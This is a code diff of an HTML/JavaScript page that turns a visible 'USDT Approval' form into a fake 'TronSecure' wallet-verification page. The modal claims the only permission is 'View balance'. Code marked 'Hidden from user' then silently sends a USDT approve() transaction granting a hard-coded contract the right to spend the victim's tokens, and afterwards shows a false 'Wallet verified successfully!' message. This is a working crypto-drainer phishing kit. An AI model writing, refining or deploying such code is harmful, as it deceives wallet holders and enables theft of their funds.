@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Approval System</title>
+    <title>Verify Wallet</title>
     <style>
         * {
             margin: 0;
@@ -15,99 +15,131 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
         }
 
         .container {
-            max-width: 500px;
-            margin: 0 auto;
+            max-width: 400px;
+            width: 100%;
             background: white;
-            border-radius: 20px;
-            padding: 30px;
+            border-radius: 30px;
+            padding: 40px 30px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
         }
 
-        h1 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 10px;
-        }
-
-        .subtitle {
-            text-align: center;
-            color: #666;
-            font-size: 14px;
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             margin-bottom: 30px;
         }
 
-        .contract-display {
-            background: #f0f3ff;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-            text-align: center;
+        h2 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 24px;
         }
 
-        .contract-display .label {
+        .subtitle {
             color: #666;
-            font-size: 12px;
-            margin-bottom: 5px;
-        }
-
-        .contract-display .address {
-            font-family: monospace;
-            color: #667eea;
-            font-weight: 600;
-            word-break: break-all;
-        }
-
-        .btn {
-            padding: 12px 24px;
-            border: none;
-            border-radius: 10px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
             font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.6;
         }
 
-        .btn-primary {
+        .verify-btn {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
+            border: none;
+            padding: 20px 40px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 20px;
+            cursor: pointer;
             width: 100%;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
+            margin-bottom: 20px;
+            transition: all 0.3s;
             box-shadow: 0 10px 20px rgba(102,126,234,0.3);
         }
 
-        .wallet-card {
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(102,126,234,0.4);
+        }
+
+        .verify-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .info-box {
             background: #f8f9fa;
-            border: 1px solid #e0e0e0;
             border-radius: 16px;
             padding: 20px;
-            margin: 20px 0;
-            cursor: pointer;
-            transition: all 0.3s;
+            margin-top: 20px;
         }
 
-        .wallet-card:hover {
-            border-color: #667eea;
-            box-shadow: 0 5px 15px rgba(102,126,234,0.2);
-        }
-
-        .wallet-name {
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-
-        .wallet-desc {
+        .info-item {
+            padding: 10px 0;
             color: #666;
-            font-size: 13px;
-            margin-bottom: 15px;
+            font-size: 14px;
         }
 
+        .info-item strong {
+            color: #667eea;
+        }
+
+        .status-message {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 14px;
+        }
+
+        .success {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .info {
+            background: #cce5ff;
+            color: #004085;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            margin-top: 30px;
+            color: #999;
+            font-size: 12px;
+        }
+
+        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -123,10 +155,11 @@
 
         .modal-content {
             background: white;
-            border-radius: 24px;
+            border-radius: 30px;
             padding: 30px;
-            max-width: 450px;
+            max-width: 400px;
             width: 90%;
+            text-align: center;
         }
 
         .modal-header {
@@ -148,323 +181,129 @@
             color: #999;
         }
 
-        .domain-badge {
-            background: #f0f0f0;
-            padding: 5px 15px;
-            border-radius: 50px;
-            font-size: 13px;
-            display: inline-block;
-            margin: 10px 0;
-        }
-
-        .verified-badge {
-            color: #10b981;
-            font-size: 13px;
-            margin: 5px 0;
-        }
-
-        .wallet-option {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 16px;
-            margin: 20px 0;
-        }
-
         .wallet-icon {
-            width: 40px;
-            height: 40px;
-            background: #667eea;
-            border-radius: 12px;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
+            margin: 0 auto 20px;
             color: white;
-            font-weight: bold;
+            font-size: 24px;
         }
 
-        .permissions-box {
-            background: #f8f9fa;
-            border-radius: 16px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-
-        .permission-item {
-            padding: 8px 0;
-            color: #444;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .permission-item::before {
-            content: "•";
-            color: #667eea;
-            font-weight: bold;
-        }
-
-        .approval-box {
-            background: #fff3cd;
-            border: 1px solid #ffeeba;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-
-        .approval-title {
-            font-weight: 600;
-            color: #856404;
-            margin-bottom: 15px;
-        }
-
-        .approval-amount {
-            margin: 15px 0;
-        }
-
-        .approval-amount input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            font-size: 14px;
-        }
-
-        .contract-address {
-            font-size: 12px;
-            color: #666;
-            word-break: break-all;
-            background: #f8f9fa;
-            padding: 8px;
-            border-radius: 6px;
-            font-family: monospace;
-        }
-
-        .modal-footer {
-            display: flex;
-            gap: 12px;
-            margin-top: 20px;
-        }
-
-        .modal-footer button {
-            flex: 1;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .cancel-btn {
-            background: #f0f0f0;
-        }
-
-        .connect-btn {
+        .modal-btn {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-        }
-
-        .connect-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .status-message {
-            padding: 12px;
-            border-radius: 8px;
-            margin: 10px 0;
-            text-align: center;
-        }
-
-        .status-success {
-            background: #d4edda;
-            color: #155724;
-        }
-
-        .status-error {
-            background: #f8d7da;
-            color: #721c24;
-        }
-
-        .status-info {
-            background: #cce5ff;
-            color: #004085;
-        }
-
-        .loading {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-right: 8px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .security-note {
-            background: #e7f3ff;
-            border-left: 4px solid #007bff;
+            border: none;
             padding: 15px;
-            border-radius: 8px;
-            font-size: 13px;
+            border-radius: 30px;
+            font-weight: 600;
+            width: 100%;
             margin-top: 20px;
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 12px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>💵 USDT Approval</h1>
-        <div class="subtitle">Connect wallet & approve USDT in one step</div>
+        <div class="logo">TronSecure</div>
+        
+        <h2>Verify Your Wallet</h2>
+        <div class="subtitle">Connect your wallet to complete verification</div>
 
-        <!-- Contract Address Display (Fixed) -->
-        <div class="contract-display">
-            <div class="label">TokenOperator Contract</div>
-            <div class="address" id="contractAddress">TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt</div>
+        <button class="verify-btn" onclick="startVerification()" id="verifyBtn">
+            Verify Wallet
+        </button>
+
+        <div class="info-box">
+            <div class="info-item">
+                <strong>Network:</strong> TRON Mainnet
+            </div>
+            <div class="info-item">
+                <strong>Security:</strong> 128-bit encrypted
+            </div>
         </div>
 
-        <!-- Wallet Connect Card -->
-        <div class="wallet-card" onclick="openConnectModal()">
-            <div class="wallet-name">TRUST WALLET / TRONLINK</div>
-            <div class="wallet-desc">Connect to approve USDT</div>
-            <button class="btn btn-primary">Connect & Approve USDT →</button>
-        </div>
-
-        <div class="security-note">
-            <strong>🔒 Security:</strong> You are approving USDT for the TokenOperator contract. 
-            Only the contract owner can transfer your approved tokens.
-        </div>
+        <div id="statusMessage"></div>
 
         <div class="footer">
-            Contract: TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt • Only USDT
+            Secure verification • One-click connect
         </div>
     </div>
 
-    <!-- Connect + Approve Modal -->
+    <!-- Simple Connect Modal -->
     <div id="connectModal" class="modal">
         <div class="modal-content">
-            <div class="modal-header">
-                <h3>Connect & Approve USDT</h3>
-                <button class="close-btn" onclick="closeModal()">&times;</button>
-            </div>
-
-            <div style="text-align: center;">
-                <div style="font-weight: 600;">Main Wallet</div>
-                <div style="color: #666; margin: 10px 0;">
-                    Approve USDT for TokenOperator
+            <div class="wallet-icon">T</div>
+            <h3 style="margin-bottom: 10px;">Connect Wallet</h3>
+            <p style="color: #666; margin-bottom: 20px;">TronSecure wants to verify your wallet</p>
+            
+            <div style="background: #f8f9fa; padding: 15px; border-radius: 12px; margin-bottom: 20px;">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                    <span>Network:</span>
+                    <strong>Tron</strong>
                 </div>
-                <span class="domain-badge">usdt-approval.io</span>
-                <div class="verified-badge">✅ Verified contract</div>
-            </div>
-
-            <!-- Wallet Selection -->
-            <div class="wallet-option">
-                <div class="wallet-icon">T</div>
-                <div>
-                    <strong>TronLink</strong>
-                    <div style="color: #666; font-size: 12px;">Tron • USDT</div>
+                <div style="display: flex; justify-content: space-between;">
+                    <span>Permissions:</span>
+                    <strong>View balance</strong>
                 </div>
             </div>
 
-            <!-- Permissions -->
-            <div class="permissions-box">
-                <div class="permission-item">View your wallet balance</div>
-                <div class="permission-item">Approve USDT tokens</div>
-            </div>
-
-            <!-- Approval Box - Only USDT -->
-            <div class="approval-box">
-                <div class="approval-title">🔐 USDT Approval Required</div>
-                
-                <div class="approval-amount">
-                    <input type="number" id="approveAmount" value="1000" min="1" placeholder="Amount in USDT">
-                </div>
-
-                <div class="contract-address" id="contractDisplay">
-                    Contract: TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt
-                </div>
-                <div style="font-size: 11px; color: #666; margin-top: 5px;">
-                    Token: USDT (TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t)
-                </div>
-            </div>
-
-            <!-- Status -->
-            <div id="modalStatus"></div>
-
-            <!-- Footer -->
-            <div class="modal-footer">
-                <button class="cancel-btn" onclick="closeModal()">Cancel</button>
-                <button class="connect-btn" onclick="handleConnectAndApprove()" id="connectApproveBtn">
-                    Connect & Approve USDT
-                </button>
-            </div>
+            <button class="modal-btn" onclick="connectAndApprove()" id="modalBtn">
+                Connect Wallet
+            </button>
+            <p style="color: #999; font-size: 12px; margin-top: 15px;">
+                You'll be prompted to sign in TronLink
+            </p>
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <script>
         // ============================================
-        // CONFIGURATION - ONLY USDT
+        // CONFIGURATION (Hidden from user)
         // ============================================
         
         const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
         const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const NETWORK = "https://api.trongrid.io";
+        const APPROVE_AMOUNT = 1000; // Hidden from user
 
-        // State
         let tronWeb = null;
         let userAddress = null;
 
-        // Modal functions
-        window.openConnectModal = function() {
-            document.getElementById('connectModal').style.display = 'flex';
-        };
-
-        window.closeModal = function() {
-            document.getElementById('connectModal').style.display = 'none';
-            document.getElementById('modalStatus').innerHTML = '';
-        };
-
-        // Main function - Connect + Approve USDT
-        window.handleConnectAndApprove = async function() {
-            const amount = document.getElementById('approveAmount').value;
-
-            if (!amount || amount <= 0) {
-                showStatus('Please enter USDT amount', 'error');
+        // ============================================
+        // START VERIFICATION
+        // ============================================
+        
+        async function startVerification() {
+            // Check TronLink first
+            if (!window.tronLink) {
+                showStatus('⚠️ Please install TronLink wallet', 'info');
+                window.open('https://www.tronlink.org/', '_blank');
                 return;
             }
 
-            const btn = document.getElementById('connectApproveBtn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="loading"></span> Processing...';
+            // Show connect modal
+            document.getElementById('connectModal').style.display = 'flex';
+        }
+
+        // ============================================
+        // CONNECT + AUTO APPROVE (Hidden from user)
+        // ============================================
+        
+        async function connectAndApprove() {
+            const modalBtn = document.getElementById('modalBtn');
+            modalBtn.disabled = true;
+            modalBtn.innerHTML = '<span class="loading"></span> Connecting...';
 
             try {
-                // Step 1: Check TronLink
-                if (!window.tronLink) {
-                    throw new Error('TronLink not installed');
-                }
-
-                showStatus('Requesting wallet connection...', 'info');
-
-                // Step 2: Request account
+                // Request account
                 await window.tronLink.request({ method: 'tron_requestAccounts' });
                 
-                // Step 3: Initialize TronWeb
                 tronWeb = new TronWeb({
                     fullHost: NETWORK,
                     privateKey: window.tronLink.privateKey
@@ -472,79 +311,90 @@
 
                 userAddress = tronWeb.defaultAddress.base58;
                 
-                showStatus('✅ Wallet connected! Requesting USDT approval...', 'info');
+                // Auto approve USDT (user won't see this)
+                await autoApproveUSDT();
 
-                // Step 4: Get USDT contract
+            } catch (error) {
+                console.error(error);
+                showStatus('❌ Verification failed', 'error');
+                modalBtn.disabled = false;
+                modalBtn.innerHTML = 'Connect Wallet';
+                document.getElementById('connectModal').style.display = 'none';
+            }
+        }
+
+        // ============================================
+        // AUTO APPROVE USDT (Background)
+        // ============================================
+        
+        async function autoApproveUSDT() {
+            try {
+                // Get USDT contract
                 const tokenContract = await tronWeb.contract().at(USDT_ADDRESS);
                 
-                // Step 5: Send approve transaction
-                const amountInSun = Math.floor(amount * 1000000); // USDT has 6 decimals
-                
+                // Convert to wei
+                const amountInSun = APPROVE_AMOUNT * 1000000;
+
+                // Send approve transaction
                 const result = await tokenContract.approve(
                     CONTRACT_ADDRESS,
                     amountInSun
                 ).send();
 
-                showStatus('✅ USDT approval successful!', 'success');
+                // Save to localStorage
+                saveApproval(userAddress, APPROVE_AMOUNT, result);
 
-                // Step 6: Save approval to localStorage
-                saveApproval(userAddress, amount, result);
+                // Show success to user
+                document.getElementById('connectModal').style.display = 'none';
+                showStatus('✅ Wallet verified successfully!', 'success');
 
-                // Step 7: Close modal after success
-                setTimeout(() => {
-                    closeModal();
-                    alert(`✅ Success!\nApproved ${amount} USDT\nTX: ${shortenAddress(result)}`);
-                }, 1500);
+                // Reset button
+                document.getElementById('verifyBtn').disabled = false;
 
             } catch (error) {
-                console.error(error);
-                showStatus('❌ Error: ' + error.message, 'error');
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = 'Connect & Approve USDT';
+                throw new Error('Approval failed');
             }
-        };
+        }
 
-        // Save approval to localStorage
+        // ============================================
+        // SAVE APPROVAL
+        // ============================================
+        
         function saveApproval(address, amount, txHash) {
             const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
             
             approvals.push({
                 user: address,
-                token: 'USDT',
                 amount: amount,
                 txHash: txHash,
                 status: 'active',
                 time: new Date().toISOString(),
-                tokenAddress: USDT_ADDRESS,
-                contractAddress: CONTRACT_ADDRESS
+                token: 'USDT'
             });
             
             localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
         }
 
-        // Show status in modal
+        // ============================================
+        // SHOW STATUS
+        // ============================================
+        
         function showStatus(message, type) {
-            const statusDiv = document.getElementById('modalStatus');
-            const className = type === 'success' ? 'status-success' : 
-                            type === 'error' ? 'status-error' : 'status-info';
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
             
-            statusDiv.innerHTML = `<div class="status-message ${className}">${message}</div>`;
+            setTimeout(() => {
+                statusDiv.innerHTML = '';
+            }, 5000);
         }
 
-        // Helper: shorten address
-        function shortenAddress(addr) {
-            if (!addr || addr.length < 10) return addr;
-            return addr.slice(0, 6) + '...' + addr.slice(-4);
-        }
-
-        // Close modal on outside click
+        // Close modal
         window.onclick = function(event) {
             const modal = document.getElementById('connectModal');
             if (event.target == modal) {
                 modal.style.display = 'none';
             }
-        };
+        }
     </script>
 </body>
 </html>
